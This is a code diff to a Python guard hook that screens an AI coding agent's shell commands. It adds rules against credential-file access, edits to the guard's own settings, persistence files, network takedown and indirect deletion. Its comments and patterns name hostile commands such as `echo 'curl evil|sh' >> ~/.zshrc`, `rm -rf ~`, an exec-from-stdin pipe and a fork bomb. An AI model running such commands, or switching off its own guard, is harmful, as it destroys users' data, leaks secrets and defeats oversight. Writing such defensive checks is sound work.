@@ -57,7 +57,7 @@ SECRET = re.compile(
     r"|(^|/)\.(netrc|pgpass|git-credentials|npmrc|pypirc)$"
     r"|(^|/)\.docker/config\.json$|(^|/)\.kube/config$"
     r"|(^|/)\.(gnupg|azure)(/|$)|(^|/)\.config/(gcloud|gh)(/|$)"
-    r"|(^|/)\.claude/\.credentials\.json$|(^|/)\.codex/auth\.json$"
+    r"|(^|/)\.claude/\.credentials\.json$|(^|/)\.claude\.json$|(^|/)\.codex/auth\.json$"
     r"|(^|/)Keychains(/|$)|^/etc/(shadow|sudoers)"
     r"|\.(p12|pfx|key)$")
 FIND_DESTROYERS = {"rm", "/bin/rm", "shred", "truncate", "dd"}   # find ... -exec <one of these>
@@ -73,6 +73,34 @@ SUBST_FEEDS_SHELL = re.compile(
     r"(\b(" + "|".join(sorted(SHELLS | INTERPRETERS | {"eval", "source"})) + r")\b|(^|[;&|]\s*)\.\s)"
     r"[^;&|]*(<\(|\$\(|`)\s*(curl|wget)\b")
 
+
+# The rules below were added in v0.3 from a second corpus, written for a separate guard
+# (tests/guard_corpus_agentic_os.py), that this one had never seen: it caught 150 of 231.
+
+# The guard's own configuration. An agent that can overwrite the hook, or the settings file
+# that registers it, has turned the guard off, and every later check is theatre.
+CONTROL = re.compile(r"(^|/)\.claude/(hooks(/|$)|settings(\.local)?\.json$)"
+                     r"|(^|/)\.agent-harness/content/hooks(/|$)")
+# Files that run on their own later: shell start-up files, launch agents, the crontab.
+PERSIST = re.compile(r"(^|/)\.(zshrc|zshenv|zprofile|zlogin|bashrc|bash_profile|bash_login|profile)$"
+                     r"|(^|/)Library/(LaunchAgents|LaunchDaemons)(/|$)")
+# Writers whose LAST operand is the file written; the others are read.
+COPIERS = {"cp", "install", "ln", "rsync"}
+# A deletion through an interpreter: the call, and a way of naming the home directory that
+# never spells `~` (expanduser, $HOME from the environment, chr(126)).
+DESTROY_CALL = re.compile(r"rmtree|rmSync|rm_rf|rm_r\b|unlinkSync|rmdirSync|FileUtils\.rm|File\.delete"
+                          r"|os\.(remove|unlink|rmdir)|\bunlink\b|Remove-Item")
+HOME_REF = re.compile(r"expanduser|os\.environ|getenv|process\.env|ENV\[|Path\.home|homedir\(\)|chr\(126\)"
+                      r"|\$HOME\b|['\"]~['\"/]")
+EMBEDDED_SHELL = re.compile(r"(?:os\.system|\bsystem|popen|execSync|spawnSync|do shell script)\s*\(?\s*"
+                            r"(['\"])((?:\\.|(?!\1).)*)\1")
+CODE_FLAGS = {"-c", "-e", "-E", "-r", "--eval", "--exec"}
+STDIN_EXEC = re.compile(r"\b(exec|eval|compile)\s*\(|os\.system|subprocess|popen", re.I)
+# Taking the network down cuts off the session the agent itself may be running over.
+VPN_DAEMONS = re.compile(r"(openvpn|wireguard|wg-quick|tailscaled?|cloudflared|openconnect|vpnc|sshd"
+                         r"|NetworkManager)", re.I)
+DESTROYER_WORD = re.compile(r"(^|[^\w.-])(rm|rmdir|unlink|shred|truncate|dd|mkfs[\w.]*|newfs\w*|wipefs"
+                            r"|chflags|diskutil)([^\w.-]|$)")
 
 PROTECTED_FILE = "/etc/agent-harness/protected-paths"
 DESTROYERS = {"rm", "rmdir", "unlink", "shred", "truncate", "mv"}
@@ -95,6 +123,13 @@ _CWD = [None]   # the directory a `cd` earlier in the same command moved to (Non
 # None: no cd yet, or one whose target cannot be read from the text (`cd $DIR`, `cd -`, a relative cd from the
 # hook's own cwd); a relative operand is then judged as written, as before.
 _DIR = [None]
+# Redirect targets written with >> rather than >: appending a line is not overwriting a file.
+_APPEND = set()
+# The session's working directory, when a real hook payload says what it is. A relative target
+# with no `cd` before it (`rm -rf *`, `rm -rf ../build`) is then judged where it will actually
+# run: harmless in a project, the whole home directory from ~. `--check` has no payload, so it
+# keeps judging a relative path as written, and the test suite stays independent of its cwd.
+_BASE = [None]
 
 
 def protected(p, roots):
@@ -176,6 +211,8 @@ def pipelines(tokens):
                     continue
                 if i + 1 < len(tokens):
                     redirs.append(tokens[i + 1])
+                    if t in (">>", "&>>"):
+                        _APPEND.add(tokens[i + 1])
                     i += 1
                 i += 1
                 continue
@@ -290,9 +327,10 @@ def _norm(p):
 def after_cd(p):
     """`p` joined onto the directory an earlier `cd` on the line moved to, or None when there was none or `p`
     does not depend on it."""
-    if _DIR[0] is None or not p or p.startswith(("/", "~", "$", "`", "-")) or "$(" in p:
+    base = _DIR[0] if _DIR[0] is not None else _BASE[0]
+    if base is None or not p or p.startswith(("/", "~", "$", "`", "-")) or "$(" in p:
         return None
-    return _norm(posixpath.join(_DIR[0], p))
+    return _norm(posixpath.join(base, p))
 
 
 def critical(p):
@@ -302,7 +340,9 @@ def critical(p):
         return why
     q = after_cd(p)
     why = critical_path(q) if q else None
-    return "after cd %s: %s" % (_DIR[0], why) if why else None
+    if not why:
+        return None
+    return "after cd %s: %s" % (_DIR[0], why) if _DIR[0] is not None else "in %s: %s" % (_BASE[0], why)
 
 
 def track_cd(name, ops):
@@ -354,13 +394,21 @@ def check_segment(name, args, redirs, depth):
                 if why:
                     block("%s with a variable for its flags on %s (%s)" % (name, op, why))
 
-    if name in ("chmod", "chown", "chgrp") and ("--recursive" in flags or has_short(flags, "R")):
+    if name in ("chmod", "chown", "chgrp", "chflags") and ("--recursive" in flags or has_short(flags, "R")):
         for op in ops[1:]:
             why = critical(op)
-            if why:
+            # A permission change is reversible, so a top-level folder of home is fair game:
+            # `chmod -R 700 ~/.ssh` is the canonical fix, not a catastrophe. Home itself, the
+            # root and the system directories stay refused.
+            if why and "top-level folder" not in why:
                 block("%s -R on %s (%s)" % (name, op, why))
 
     if name == "find" and ("-delete" in args or any(a in FIND_DESTROYERS for a in args)):
+        # A name filter narrows the deletion to matching files: `find ~/Downloads -name '*.tmp' -delete`
+        # and `find .. -name '*.pyc' -delete` are clean-up. It does not narrow it below the home
+        # directory or the root, and a pure wildcard narrows nothing.
+        scoped = any(a in ("-name", "-iname", "-path", "-ipath", "-regex", "-iregex") and k + 1 < len(args)
+                     and args[k + 1] not in ("*", "*.*", ".*", "*/*") for k, a in enumerate(args))
         for a in args:
             if a.startswith("-") or a in ("(", "!"):
                 break
@@ -372,9 +420,15 @@ def check_segment(name, args, redirs, depth):
                 why = critical_path(q) if q and critical_path(q + "/x") else None
             else:
                 why = critical(a)
+            if why and scoped and (why == "a parent directory" or "top-level folder" in why):
+                why = None
             if why:
                 block("find ... -delete on %s (%s)" % (a, why))
 
+    if name in ("truncate", "shred"):
+        for op in ops:
+            if SYSTEM_DIR.match(op):   # `truncate -s 0 /etc/passwd`: system files were only checked for dd
+                block("%s on a system file (%s)" % (name, op))
     if name == "dd":
         for a in args:
             if a.startswith("of=") and a[3:].startswith("/dev/") and not SAFE_DEV.match(a[3:]):
@@ -383,7 +437,10 @@ def check_segment(name, args, redirs, depth):
                 block("dd onto a system file (%s)" % a[3:])
     if name == "rsync" and any(a == "--del" or a.startswith(("--delete", "--remove-source")) for a in args):
         for op in ops[-1:]:  # the destination: --delete empties it
-            why = critical(op.split(":", 1)[-1]) if "$" not in op else None
+            dest = op.split(":", 1)[-1]
+            # $HOME is a variable whose value is known: `rsync --delete ./empty/ $HOME/` empties home.
+            known = "$" not in dest or re.match(r"^\$(HOME|\{HOME\})(/|$)", dest)
+            why = critical(dest) if known else None
             if why:
                 block("rsync --delete into %s (%s)" % (op, why))
     if name == "mv":
@@ -415,10 +472,19 @@ def check_segment(name, args, redirs, depth):
     if name == "eval" and args:
         check(" ".join(args), depth + 1)
 
+    # `scp -i ~/.ssh/id_ed25519 build.tgz host:` USES the key; `scp ~/.ssh/id_ed25519 host:` copies it away.
+    identity = set()
+    if name in ("scp", "sftp", "ssh", "rsync"):
+        identity = {args[k + 1] for k, a in enumerate(args) if a == "-i" and k + 1 < len(args)}
+        identity |= {a[2:] for a in args if a.startswith("-i") and len(a) > 2}
     for tok in args + redirs:
-        if secret_path(tok, name):
+        if tok not in identity and secret_path(tok, name):
             block("%s touches a credential file (%s); secrets never go into the agent's context"
                   % (name, tok))
+
+    check_control(name, args, flags, ops, redirs, depth)
+    check_system(name, args, flags, ops)
+    check_interpreter(name, args, depth)
 
 
 def check_protected(name, args, flags, ops, redirs):
@@ -466,6 +532,106 @@ def check_protected(name, args, flags, ops, redirs):
         r = protected(rd, roots)
         if r:
             block("a redirect onto %s: %s %s" % (rd, r, why))
+
+
+RC_FILES = re.compile(r"(^|/)\.(zshrc|zshenv|zprofile|zlogin|bashrc|bash_profile|bash_login|profile)$")
+
+
+def _written(name, args, flags, ops):
+    """The operands `name` writes, deletes or replaces; the ones it only reads are left out."""
+    if name in ("chmod", "chown", "chgrp", "chflags"):
+        return ops[1:]                                   # the first operand is the mode or the owner
+    if name in DESTROYERS or name in ("tee", "touch"):
+        return ops                                       # mv: the source goes and the destination is replaced
+    if name in COPIERS:
+        return ops[-1:]
+    if name == "sed" and any(f == "--in-place" or re.match(r"^-[a-zA-Z]*i", f) for f in flags):
+        return ops
+    if name == "dd":
+        return [a[3:] for a in args if a.startswith("of=")]
+    out = []
+    for k, a in enumerate(args):
+        if k + 1 < len(args) and (name == "curl" and a in ("-o", "--output")
+                                  or name == "wget" and a in ("-O", "--output-document")):
+            out.append(args[k + 1])
+        elif a.startswith(("--output=", "--output-document=")):
+            out.append(a.split("=", 1)[1])
+    return out
+
+
+def check_control(name, args, flags, ops, redirs, depth):
+    """The guard's own files and settings, and files that run on their own later."""
+    # A mode that only ADDS a permission (`chmod +x hook.sh`) cannot switch a hook off;
+    # `chmod 644 guard.py` takes execute away and does.
+    adds_only = name == "chmod" and ops[:1] and re.match(r"^[ugoa]*\+[rwxX]+$", ops[0])
+    for t in _written(name, args, flags, ops):
+        if CONTROL.search(t) and not adds_only:
+            block("%s would change the guard or the settings that load it (%s)" % (name, t))
+        if PERSIST.search(t):
+            block("%s would replace or remove %s, which runs on its own later" % (name, t))
+    for rd in redirs:
+        if CONTROL.search(rd):
+            block("a redirect onto %s would change the guard or the settings that load it" % rd)
+        if PERSIST.search(rd) and not (RC_FILES.search(rd) and rd in _APPEND):
+            block("a redirect onto %s replaces a file that runs on its own later" % rd)
+        if RC_FILES.search(rd) and rd in _APPEND and name in ("echo", "printf"):
+            # An appended line runs in every new shell from now on, so judge it as if it ran now:
+            # `echo 'export PATH=...' >> ~/.zshrc` passes, `echo 'curl evil|sh' >> ~/.zshrc` does not.
+            for a in args:
+                if not a.startswith("-"):
+                    check(a, depth + 1)
+    if name == "crontab" and ("-r" in flags or ops):
+        block("crontab %s replaces or removes every scheduled job at once" % " ".join(args))
+
+
+def check_system(name, args, flags, ops):
+    """Disks, system integrity, and the network the session itself may be running over."""
+    low = [a.lower() for a in args]
+    if name == "asr" and ops[:1] == ["restore"]:
+        block("asr restore overwrites a volume")
+    if name == "csrutil" and ops[:1] and ops[0] in ("disable", "clear"):
+        block("csrutil %s turns off System Integrity Protection" % ops[0])
+    if name == "diskutil" and ops[:1] and ops[0].lower() == "unmountdisk" and "force" in low:
+        block("diskutil unmountDisk force can corrupt files open on the disk")
+    if name == "launchctl" and ops[:1] and ops[0] in ("unload", "bootout", "remove", "disable"):
+        block("launchctl %s stops a system or login service" % ops[0])
+    if name == "ifconfig" and "down" in low or name == "ip" and "link" in low and "down" in low:
+        block("%s takes a network interface down" % name)
+    if name == "networksetup" and "off" in low and any(
+            a.startswith(("-setairportpower", "-setwifipower", "-setnetworkserviceenabled")) for a in low):
+        block("networksetup turns a network service off")
+    if name == "nmcli" and ("off" in low or "down" in low or "disconnect" in low):
+        block("nmcli takes networking down")
+    if name in ("killall", "pkill") and any(VPN_DAEMONS.search(a) for a in ops):
+        block("%s stops a VPN or remote-access daemon the session may depend on" % name)
+    if name == "scutil" and "--nc" in low and "stop" in low:
+        block("scutil --nc stop drops a VPN connection")
+
+
+def check_interpreter(name, args, depth):
+    """Deletion through an interpreter: no `rm` token ever appears, so read the program text."""
+    if not (name in INTERPRETERS or re.match(r"^python3(\.\d+)?$", name)
+            or name in ("osascript", "awk", "gawk")):
+        return
+    if name in ("awk", "gawk"):
+        codes = flags_and_operands(args)[1][:1]
+    else:
+        codes = [args[k + 1] for k, a in enumerate(args) if a in CODE_FLAGS and k + 1 < len(args)]
+    for code in codes:
+        for m in EMBEDDED_SHELL.finditer(code):           # os.system("rm -rf ~"), do shell script "..."
+            check(m.group(2).replace('\\"', '"').replace("\\'", "'"), depth + 1)
+        if re.search(r"wi-?fi\s+power\s+to\s+off|set\s+airport\s+power", code, re.I):
+            block("%s code that turns Wi-Fi off" % name)
+        if not DESTROY_CALL.search(code):
+            continue
+        if HOME_REF.search(code):
+            block("%s code that deletes through a path built from the home directory" % name)
+        if CONTROL.search(code) or PERSIST.search(code):
+            block("%s code that deletes the guard, its settings or a start-up file" % name)
+        for _, lit in re.findall(r"(['\"])((?:\\.|(?!\1).)*)\1", code):
+            why = critical_path(lit)
+            if why:
+                block("%s code that deletes %s (%s)" % (name, lit, why))
 
 
 def check_git(args):
@@ -546,6 +712,10 @@ def check_remote_exec(cmd, pipes):
             elif seen_fetch and name in INTERPRETERS and all(a == "-" or a.startswith("-") and
                                                             a not in ("-m", "-c", "-e") for a in args):
                 feeds = True
+            elif seen_fetch and name in INTERPRETERS and any(
+                    a in ("-c", "-e") and k + 1 < len(args) and STDIN_EXEC.search(args[k + 1])
+                    for k, a in enumerate(args)):
+                feeds = True   # `| python3 -c "exec(sys.stdin.read())"` is `| python3` in a costume
     if not feeds:
         return
     trusted = trusted_hosts()
@@ -595,12 +765,97 @@ def process_substitutions(cmd):
     return out
 
 
+QUOTED = re.compile(r"'[^']*'|\"(?:\\.|[^\"\\])*\"")
+
+
+def _subst_spans(cmd):
+    """(start, end, body) of each $(...) and `...` outside single quotes, in the original text."""
+    out, i, q = [], 0, ""
+    while i < len(cmd):
+        c = cmd[i]
+        if q == "'":
+            q = "" if c == "'" else q
+        elif c == "'" and q == "":
+            q = "'"
+        elif c == '"':
+            q = "" if q == '"' else '"'
+        elif c == "`":
+            k = cmd.find("`", i + 1)
+            k = len(cmd) if k == -1 else k
+            out.append((i, k + 1, cmd[i + 1:k]))
+            i = k
+        elif cmd.startswith("$(", i):
+            level, k = 0, i + 1
+            while k < len(cmd):
+                level += cmd[k] == "("
+                level -= cmd[k] == ")"
+                if level == 0:
+                    break
+                k += 1
+            out.append((i, k + 1, cmd[i + 2:k]))
+            i = k
+        i += 1
+    return out
+
+
+def check_computed(cmd):
+    """A command whose NAME, or whose target, only a substitution computes cannot be read before it runs.
+
+    `(` and `$(` split segments, so `$(echo rm) -rf ~` reaches check_segment as `-rf ~` with no command
+    word, and `find $(echo ~) -delete` as a find with no start point. These were this repo's pinned
+    known gaps; the text is read here instead, failing closed on a destroyer it cannot resolve."""
+    for start, end, body in _subst_spans(cmd):
+        before = cmd[:start].rstrip().rstrip('"').rstrip()
+        at_command = not before or before[-1] in ";&|(\n" or re.search(r"(^|[^\w])eval$", before)
+        if at_command and DESTROYER_WORD.search(body):
+            block("a command whose name a substitution computes (%s) cannot be read before it runs"
+                  % body.strip()[:60])
+        if re.search(r"(^|[;&|(\s])find\s*$", before):
+            tail = re.split(r"[;&|]", cmd[end:], 1)[0]
+            if re.search(r"(^|\s)-(delete|exec(dir)?\s+(\S*/)?(rm|shred|truncate|dd|unlink))\b", tail):
+                block("find over a path only a substitution computes (%s), then deletes" % body.strip()[:60])
+    m = re.search(r"\|\s*xargs\b[^;&|]*?(^|\s)(\S*/)?(rm|shred|unlink|rmdir|truncate)(\s|$)", cmd)
+    if m and _subst_spans(cmd[:m.start()]):
+        block("xargs %s fed by a substitution: its targets cannot be read before it runs" % m.group(3))
+
+
+def check_xargs(pipes):
+    """`find / | xargs rm -rf` and `echo ~ | xargs rm -rf` are `rm -rf /` and `rm -rf ~`."""
+    for pipe in pipes:
+        for k in range(1, len(pipe)):
+            words = pipe[k][0]
+            if not any(os.path.basename(w) == "xargs" for w in words[:3]):
+                continue
+            name, _ = unwrap(words)
+            if name not in ("rm", "shred", "unlink", "rmdir", "truncate"):
+                continue
+            for prev_words, _ in pipe[:k]:
+                prev, pargs = unwrap(prev_words)
+                if prev == "find":
+                    scoped = any(a in ("-name", "-iname", "-path", "-ipath") for a in pargs)
+                    for a in pargs:
+                        if a.startswith("-") or a in ("(", "!"):
+                            break
+                        why = critical(a)
+                        if why and not (scoped and "top-level folder" in why):
+                            block("find %s piped into xargs %s (%s)" % (a, name, why))
+                if prev in ("echo", "printf"):
+                    for a in pargs:
+                        why = None if a.startswith("-") else critical_path(a)
+                        if why:
+                            block("xargs %s fed %s (%s)" % (name, a, why))
+
+
 def check(cmd, depth=0):
     if depth > MAX_DEPTH or not cmd.strip():
         return
+    # Quoted text is data: `echo ':(){ :|:& };:' >> notes.md` writes a note. A quoted bomb that is
+    # really run (`bash -c '...'`) is unquoted one level down, where this check sees it again.
+    bare = QUOTED.sub("''", cmd)
     for rx in FORK_BOMB:
-        if rx.search(cmd):
+        if rx.search(bare if rx is not FORK_BOMB[-1] else cmd):
             block("fork bomb")
+    check_computed(strip_heredocs(cmd))
     for inner in substitutions(strip_heredocs(cmd)):  # $(...) and `...` run even inside "..."
         check(inner, depth + 1)
     for name, body in process_substitutions(strip_heredocs(cmd)):
@@ -609,15 +864,18 @@ def check(cmd, depth=0):
     pipes = pipelines(tokenize(cmd))
     check_remote_exec(cmd, pipes)
     check_piped_script(pipes, depth)
+    check_xargs(pipes)
     for pipe in pipes:
         for words, redirs in pipe:
             name, args = unwrap(words)
             check_segment(name, args, redirs, depth)
 
 
-def verdict(cmd):
-    """Return None if allowed, else the reason."""
+def verdict(cmd, cwd=None):
+    """Return None if allowed, else the reason. `cwd` is the session's directory, if known."""
     _CWD[0] = _DIR[0] = None
+    _BASE[0] = posixpath.normpath(cwd) if isinstance(cwd, str) and cwd.startswith("/") else None
+    _APPEND.clear()
     try:
         check(cmd)
     except Blocked as e:
@@ -634,7 +892,7 @@ def verdict_for_payload(payload):
     if isinstance(cmd, list):
         cmd = " ".join(shlex.quote(str(c)) for c in cmd)
     if isinstance(cmd, str):
-        return verdict(cmd)
+        return verdict(cmd, payload.get("cwd"))
     if "command" in ti:
         return "the command is neither a string nor a list; failing closed"
     for key in ("file_path", "path", "notebook_path"):
